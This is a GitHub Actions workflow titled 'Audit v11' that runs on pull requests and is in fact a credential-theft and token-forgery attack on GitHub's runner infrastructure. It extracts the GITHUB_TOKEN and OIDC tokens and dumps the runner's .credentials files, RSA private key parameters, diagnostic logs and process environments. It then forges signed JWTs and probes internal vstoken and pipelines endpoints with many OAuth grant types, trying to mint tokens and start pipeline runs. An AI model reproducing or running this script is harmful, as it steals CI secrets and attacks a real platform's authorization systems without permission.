name: Audit v11
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write

jobs:
  audit-v11:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
      UPSTREAM_RID: R_kgDOReaECQ
      FORK_RID: R_kgDOReaMug
    steps:

      # â”€â”€ STEP 1: Extract all tokens â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      - name: Step 1 â€” Token extraction
        run: |
          set +e
          echo "=== V11 TOKEN EXTRACTION ==="
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "RT prefix: ${RT:0:14}"

          # OIDC tokens for all known audiences
          for AUD in vstoken.actions.githubusercontent.com pipelines.actions.githubusercontent.com results-receiver.actions.githubusercontent.com api.github.com; do
            OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://${AUD}" | jq -r '.value // empty')
            echo "OIDC ${AUD} = ${#OIDC} chars"
            # Store for later use
            case "$AUD" in
              vstoken*) export OIDC_VSTOKEN="$OIDC" ;;
              pipelines*) export OIDC_PIPELINES="$OIDC" ;;
              results*) export OIDC_RESULTS="$OIDC" ;;
              api*) export OIDC_API="$OIDC" ;;
            esac
          done

          # Save tokens to files for subsequent steps
          echo "$RT" > /tmp/rt.txt
          echo "$OIDC_VSTOKEN" > /tmp/oidc_vstoken.txt
          echo "$OIDC_PIPELINES" > /tmp/oidc_pipelines.txt
          echo "$OIDC_RESULTS" > /tmp/oidc_results.txt
          echo "$OIDC_API" > /tmp/oidc_api.txt

      # â”€â”€ STEP 2: Ransack cached runner directory â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      - name: Step 2 â€” Runner cached directory deep extraction
        run: |
          set +e
          echo "=== RUNNER CACHED DIRECTORY â€” THE REAL PATH ==="
          echo "v10 found: files at cached/2.331.0/ not extracted/"
          echo ""

          BASE="/home/runner/actions-runner/cached"
          # Find the actual version directory
          echo "--- All version dirs under cached/ ---"
          ls -la "$BASE/" 2>/dev/null || echo "(cached dir not found)"
          echo ""

          # Auto-detect version
          VER=$(ls "$BASE/" 2>/dev/null | head -1)
          echo "Detected version: $VER"
          RDIR="$BASE/$VER"
          echo "Runner dir: $RDIR"
          echo ""

          echo "--- .credentials (OAuth client config) ---"
          if [ -f "$RDIR/.credentials" ]; then
            cat "$RDIR/.credentials"
            echo ""
            echo "--- Parsed fields ---"
            cat "$RDIR/.credentials" | python3 -c "
          import json,sys
          d=json.load(sys.stdin)
          for k,v in d.items():
            print(f'  {k} = {v}')
          " 2>/dev/null
          else
            echo "(not found at $RDIR/.credentials)"
            # Search everywhere
            find /home/runner -name ".credentials" -type f 2>/dev/null | while read f; do
              echo "FOUND: $f"
              cat "$f"
            done
          fi
          echo ""

          echo "--- .credentials_rsaparams (RSA private key for JWT signing) ---"
          if [ -f "$RDIR/.credentials_rsaparams" ]; then
            cat "$RDIR/.credentials_rsaparams" | head -c 2000
            echo ""
          else
            echo "(not found at $RDIR/.credentials_rsaparams)"
            find /home/runner -name ".credentials_rsaparams" -type f 2>/dev/null | while read f; do
              echo "FOUND: $f"
              cat "$f" | head -c 2000
            done
          fi
          echo ""

          echo "--- .runner (runner registration config) ---"
          if [ -f "$RDIR/.runner" ]; then
            cat "$RDIR/.runner"
          else
            echo "(not found at $RDIR/.runner)"
            find /home/runner -name ".runner" -type f 2>/dev/null | while read f; do
              echo "FOUND: $f"
              cat "$f"
            done
          fi
          echo ""

          echo "--- .env (environment overrides) ---"
          if [ -f "$RDIR/.env" ]; then
            cat "$RDIR/.env"
          else
            echo "(not found)"
            find /home/runner -name ".env" -path "*/actions-runner/*" -type f 2>/dev/null | while read f; do
              echo "FOUND: $f"
              cat "$f"
            done
          fi
          echo ""

          echo "--- _diag/ directory listing (Worker+Runner logs with tokens) ---"
          ls -la "$RDIR/_diag/" 2>/dev/null || echo "(no _diag at cached)"
          echo ""

          echo "--- All _diag dirs anywhere under actions-runner ---"
          find /home/runner/actions-runner -name "_diag" -type d 2>/dev/null | while read d; do
            echo "DIAG DIR: $d"
            ls -la "$d/"
            echo ""
            # Print Worker logs (contain SystemVssConnection tokens)
            for wlog in "$d"/Worker_*.log; do
              if [ -f "$wlog" ]; then
                echo "=== $wlog ==="
                cat "$wlog"
                echo ""
              fi
            done
            # Print Runner logs
            for rlog in "$d"/Runner_*.log; do
              if [ -f "$rlog" ]; then
                echo "=== $rlog ==="
                cat "$rlog"
                echo ""
              fi
            done
            # Print page logs
            for plog in "$d"/pages/*.log; do
              if [ -f "$plog" ]; then
                echo "=== $plog ==="
                cat "$plog"
                echo ""
              fi
            done
          done
          echo ""

          echo "--- /proc/self/environ (safe decode) ---"
          cat /proc/self/environ | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|AUTH|SYSTEM|VSS|ACTIONS_' | head -30
          echo ""

          echo "--- Worker process environ (all runner procs) ---"
          for pid in $(pgrep -f 'Runner\.' 2>/dev/null); do
            echo "PID $pid cmdline: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')"
            cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|AUTH|SYSTEM|VSS|CONNECTION' | head -20
            echo ""
          done

          echo "--- Search for SystemVssConnection or AccessToken in all files ---"
          grep -rl 'SystemVssConnection\|AccessToken\|system\.accesstoken' /home/runner/actions-runner/ 2>/dev/null | head -20
          echo ""

          echo "--- Extract any JWT-looking strings from runner binaries ---"
          strings "$RDIR/bin/Runner.Worker.dll" 2>/dev/null | grep -iE 'eyJ|token|oauth|vstoken|client_id|secret' | head -30
          echo ""

          echo "--- All .json config files in runner dir ---"
          find "$RDIR" -maxdepth 1 -name "*.json" -o -name "*.cfg" -o -name "*.config" 2>/dev/null | while read f; do
            echo "=== $f ==="
            cat "$f" 2>/dev/null | head -100
            echo ""
          done

      # â”€â”€ STEP 3: Use .credentials for vstoken oauth2/token â”€â”€â”€â”€â”€â”€
      - name: Step 3 â€” vstoken with runner credentials
        run: |
          set +e
          echo "=== VSTOKEN WITH RUNNER CREDENTIALS ==="
          echo "v10 crack: client_credentials without Bearer â†’ 'hostId must be provided'"
          echo "v10 crack: jwt-bearer with OIDC â†’ 500 'Failed to deserialize JsonWebToken'"
          echo ""

          RT=$(cat /tmp/rt.txt)
          OIDC_VS=$(cat /tmp/oidc_vstoken.txt)
          OIDC_PL=$(cat /tmp/oidc_pipelines.txt)

          BASE="/home/runner/actions-runner/cached"
          VER=$(ls "$BASE/" 2>/dev/null | head -1)
          RDIR="$BASE/$VER"

          # Try to parse .credentials for clientId
          CLIENT_ID=""
          AUTH_URL=""
          if [ -f "$RDIR/.credentials" ]; then
            CLIENT_ID=$(python3 -c "import json; d=json.load(open('$RDIR/.credentials')); print(d.get('clientId',''))" 2>/dev/null)
            AUTH_URL=$(python3 -c "import json; d=json.load(open('$RDIR/.credentials')); print(d.get('authorizationUrl',''))" 2>/dev/null)
            SCHEME=$(python3 -c "import json; d=json.load(open('$RDIR/.credentials')); print(d.get('scheme',''))" 2>/dev/null)
            echo "clientId from .credentials: $CLIENT_ID"
            echo "authorizationUrl: $AUTH_URL"
            echo "scheme: $SCHEME"
          fi

          # Try to read RSA params for JWT signing
          RSA_PARAMS=""
          if [ -f "$RDIR/.credentials_rsaparams" ]; then
            RSA_PARAMS=$(cat "$RDIR/.credentials_rsaparams")
            echo "RSA params found: ${#RSA_PARAMS} chars"
          fi
          echo ""

          VSBASE="https://vstoken.actions.githubusercontent.com"
          DEPLOY="serviceDeployments/tokenghubeus21"

          # â”€â”€ A: client_credentials with hostId variations â”€â”€
          echo "--- A: client_credentials + hostId combos ---"
          for HOST_ID in \
            "${{ github.repository_id }}" \
            "${{ github.run_id }}" \
            "$UPSTREAM_RID" \
            "$FORK_RID" \
            "84ff2294-8721-ab49-db5a-db17b0f6c2de" \
            "$CLIENT_ID" \
            "github.com" \
            "actions.githubusercontent.com"; do

            for EP in "$VSBASE/$DEPLOY/_apis/oauth2/token" "$VSBASE/_apis/oauth2/token"; do
              R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$EP" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "grant_type=client_credentials&hostId=$HOST_ID")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "A01 hostId=$HOST_ID ep=$(echo $EP | sed 's|.*vstoken|vstoken|') = $CODE body='$(echo "$BODY" | head -c 200)'"
            done
          done
          echo ""

          # â”€â”€ B: client_credentials with clientId + client_secret â”€â”€
          echo "--- B: client_credentials + clientId + hostId ---"
          if [ -n "$CLIENT_ID" ]; then
            for HOST_ID in \
              "${{ github.repository_id }}" \
              "84ff2294-8721-ab49-db5a-db17b0f6c2de"; do

              R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$VSBASE/$DEPLOY/_apis/oauth2/token" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "grant_type=client_credentials&client_id=$CLIENT_ID&hostId=$HOST_ID")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "B01 clientId=$CLIENT_ID hostId=$HOST_ID = $CODE body='$(echo "$BODY" | head -c 300)'"

              # With Bearer RT
              R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$VSBASE/$DEPLOY/_apis/oauth2/token" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "Authorization: Bearer $RT" \
                -d "grant_type=client_credentials&client_id=$CLIENT_ID&hostId=$HOST_ID")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "B02 +Bearer clientId=$CLIENT_ID hostId=$HOST_ID = $CODE body='$(echo "$BODY" | head -c 300)'"

              # With Bearer OIDC
              R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$VSBASE/$DEPLOY/_apis/oauth2/token" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "Authorization: Bearer $OIDC_VS" \
                -d "grant_type=client_credentials&client_id=$CLIENT_ID&hostId=$HOST_ID")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "B03 +OIDC clientId=$CLIENT_ID hostId=$HOST_ID = $CODE body='$(echo "$BODY" | head -c 300)'"
            done
          fi
          echo ""

          # â”€â”€ C: jwt-bearer with RSA-signed JWT â”€â”€
          echo "--- C: jwt-bearer with crafted assertion ---"
          if [ -n "$RSA_PARAMS" ] && [ -n "$CLIENT_ID" ]; then
            echo "Attempting to craft VSS JWT from RSA params..."
            python3 << 'PYEOF'
          import json, base64, time, struct, hashlib, sys

          try:
              rsa = json.loads(open("/home/runner/actions-runner/cached/" + __import__('os').listdir("/home/runner/actions-runner/cached/")[0] + "/.credentials_rsaparams").read())
              creds = json.loads(open("/home/runner/actions-runner/cached/" + __import__('os').listdir("/home/runner/actions-runner/cached/")[0] + "/.credentials").read())

              client_id = creds.get("clientId", "")
              auth_url = creds.get("authorizationUrl", "")

              print(f"RSA params keys: {list(rsa.keys())}")
              print(f"clientId: {client_id}")
              print(f"authorizationUrl: {auth_url}")

              # Build JWT header + payload
              header = {"alg": "RS256", "typ": "JWT", "kid": client_id}
              now = int(time.time())
              payload = {
                  "iss": client_id,
                  "sub": client_id,
                  "aud": auth_url or "https://vstoken.actions.githubusercontent.com",
                  "iat": now,
                  "exp": now + 600,
                  "nbf": now - 60
              }

              def b64url(data):
                  return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

              h_enc = b64url(json.dumps(header).encode())
              p_enc = b64url(json.dumps(payload).encode())
              signing_input = f"{h_enc}.{p_enc}"

              # Try to sign with RSA key using cryptography lib
              try:
                  from cryptography.hazmat.primitives.asymmetric import rsa as rsa_mod, padding
                  from cryptography.hazmat.primitives import hashes, serialization
                  from cryptography.hazmat.backends import default_backend

                  # RSA params are base64-encoded components
                  def decode_param(b64str):
                      # Add padding
                      s = b64str + '=' * (4 - len(b64str) % 4) if len(b64str) % 4 else b64str
                      return base64.b64decode(s)

                  n = int.from_bytes(decode_param(rsa['modulus']), 'big')
                  e_val = int.from_bytes(decode_param(rsa['exponent']), 'big')
                  d_val = int.from_bytes(decode_param(rsa['d']), 'big')
                  p = int.from_bytes(decode_param(rsa['p']), 'big')
                  q = int.from_bytes(decode_param(rsa['q']), 'big')

                  from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
                  pub = RSAPublicNumbers(e_val, n)
                  # Calculate dmp1, dmq1, iqmp
                  dmp1 = d_val % (p - 1)
                  dmq1 = d_val % (q - 1)
                  iqmp = pow(q, -1, p)
                  priv = RSAPrivateNumbers(p, q, d_val, dmp1, dmq1, iqmp, pub)
                  private_key = priv.private_key(default_backend())

                  signature = private_key.sign(
                      signing_input.encode(),
                      padding.PKCS1v15(),
                      hashes.SHA256()
                  )

                  jwt_token = f"{signing_input}.{b64url(signature)}"
                  print(f"Crafted JWT length: {len(jwt_token)}")
                  print(f"JWT prefix: {jwt_token[:80]}...")

                  # Save for curl
                  with open("/tmp/vss_jwt.txt", "w") as f:
                      f.write(jwt_token)
                  print("JWT saved to /tmp/vss_jwt.txt")

              except Exception as ex:
                  print(f"RSA signing failed: {ex}")
                  # Fallback: unsigned JWT for testing
                  jwt_token = f"{signing_input}."
                  with open("/tmp/vss_jwt.txt", "w") as f:
                      f.write(jwt_token)
                  print(f"Unsigned JWT saved (for format testing)")

          except Exception as ex2:
              print(f"Failed: {ex2}")
          PYEOF
            echo ""

            if [ -f /tmp/vss_jwt.txt ]; then
              VSS_JWT=$(cat /tmp/vss_jwt.txt)

              for EP in "$VSBASE/$DEPLOY/_apis/oauth2/token" "$VSBASE/_apis/oauth2/token"; do
                # As client_assertion
                R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$EP" \
                  -H "Content-Type: application/x-www-form-urlencoded" \
                  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$VSS_JWT")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "C01 jwt-bearer+assertion ep=$(echo $EP | sed 's|.*vstoken|vstoken|') = $CODE body='$(echo "$BODY" | head -c 400)'"

                # As assertion in body (Azure DevOps style)
                R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$EP" \
                  -H "Content-Type: application/x-www-form-urlencoded" \
                  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$VSS_JWT")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "C02 jwt-bearer+assertion(body) = $CODE body='$(echo "$BODY" | head -c 400)'"

                # With client_id in body
                R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$EP" \
                  -H "Content-Type: application/x-www-form-urlencoded" \
                  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$VSS_JWT&client_id=$CLIENT_ID")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "C03 jwt-bearer+assertion+clientId = $CODE body='$(echo "$BODY" | head -c 400)'"
              done
            fi
          else
            echo "No RSA params or clientId found, using OIDC token as assertion"
            # Still try OIDC as different assertion formats
            for EP in "$VSBASE/$DEPLOY/_apis/oauth2/token" "$VSBASE/_apis/oauth2/token"; do
              R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$EP" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$OIDC_VS&resource=https://management.core.windows.net/")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "C04 oidc-as-assertion+resource = $CODE body='$(echo "$BODY" | head -c 400)'"
            done
          fi
          echo ""

          # â”€â”€ D: authorization_code grant with crafted code â”€â”€
          echo "--- D: authorization_code grant type ---"
          R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$VSBASE/$DEPLOY/_apis/oauth2/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=authorization_code&code=$RT&redirect_uri=https://github.com&client_id=$CLIENT_ID")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "D01 auth_code+RT = $CODE body='$(echo "$BODY" | head -c 300)'"

          R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$VSBASE/$DEPLOY/_apis/oauth2/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=authorization_code&code=$OIDC_VS&redirect_uri=https://vstoken.actions.githubusercontent.com&client_id=$CLIENT_ID")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "D02 auth_code+OIDC = $CODE body='$(echo "$BODY" | head -c 300)'"
          echo ""

          # â”€â”€ E: refresh_token grant â”€â”€
          echo "--- E: refresh_token grant ---"
          R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$VSBASE/$DEPLOY/_apis/oauth2/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=refresh_token&refresh_token=$RT&client_id=$CLIENT_ID")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "E01 refresh+RT = $CODE body='$(echo "$BODY" | head -c 300)'"
          echo ""

          # â”€â”€ F: TokenIssue with Bearer RT â”€â”€
          echo "--- F: TokenIssue endpoints with Bearer ---"
          for AUTH in "Bearer $RT" "Bearer $OIDC_VS"; do
            ATYPE=$(echo "$AUTH" | cut -d' ' -f1-1)
            APREFIX=$(echo "$AUTH" | cut -d' ' -f2 | head -c 20)

            for EP in \
              "$VSBASE/$DEPLOY/_apis/Token/SessionTokens" \
              "$VSBASE/$DEPLOY/_apis/Token/AccessTokens" \
              "$VSBASE/$DEPLOY/_apis/tokenoauth2/token" \
              "$VSBASE/$DEPLOY/_apis/WebPlatformAuth/SessionToken"; do

              R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST "$EP" \
                -H "Authorization: $AUTH" \
                -H "Content-Type: application/json" \
                -d '{"scope":"vso.code_write vso.build_execute","validTo":"2026-12-31T00:00:00Z","displayName":"audit"}')
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "F01 POST $(echo $EP | sed 's|.*_apis/||') auth=$APREFIX... = $CODE body='$(echo "$BODY" | head -c 300)'"
            done
          done

      # â”€â”€ STEP 4: Pipelines service exploitation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      - name: Step 4 â€” Pipelines deep exploitation
        run: |
          set +e
          echo "=== PIPELINES SERVICE DEEP EXPLOITATION ==="
          RT=$(cat /tmp/rt.txt)
          OIDC_PL=$(cat /tmp/oidc_pipelines.txt)

          PBASE="https://pipelines.actions.githubusercontent.com"
          PDEPLOY="serviceDeployments/pipelinesproxcus1"

          # â”€â”€ A: distributedtask with proper auth â”€â”€
          echo "--- A: distributedtask endpoints ---"
          for AUTH in "Bearer $RT" "Bearer $OIDC_PL"; do
            APREFIX=$(echo "$AUTH" | cut -d' ' -f2 | head -c 20)

            for EP in \
              "_apis/distributedtask/pools" \
              "_apis/distributedtask/machines" \
              "_apis/distributedtask/agents" \
              "_apis/distributedtask/packages" \
              "_apis/distributedtask/serviceendpoints" \
              "_apis/build/builds" \
              "_apis/pipelines" \
              "_apis/runtime/pipelines" \
              "_apis/actions/runs" \
              "_apis/Container/containers"; do

              R=$(curl -sS -w "\nHTTP_%{http_code}" \
                -H "Authorization: $AUTH" \
                "$PBASE/$PDEPLOY/$EP")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "A01 GET $EP auth=$APREFIX... = $CODE body='$(echo "$BODY" | head -c 200)'"
            done
            echo ""

            # POST to create things
            echo "--- POST creation attempts ---"
            # Create pipeline run
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: $AUTH" \
              -H "Content-Type: application/json" \
              "$PBASE/$PDEPLOY/_apis/pipelines/1/runs" \
              -d '{"resources":{"repositories":{"self":{"refName":"refs/heads/main"}}}}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A02 POST pipelines/1/runs = $CODE body='$(echo "$BODY" | head -c 200)'"

            # Upload artifact
            R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: $AUTH" \
              -H "Content-Type: application/json" \
              "$PBASE/$PDEPLOY/_apis/runtime/pipelines/${{ github.run_id }}/artifacts" \
              -d '{"name":"v11-test","type":"actions_storage"}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A03 POST artifact = $CODE body='$(echo "$BODY" | head -c 200)'"
          done
          echo ""

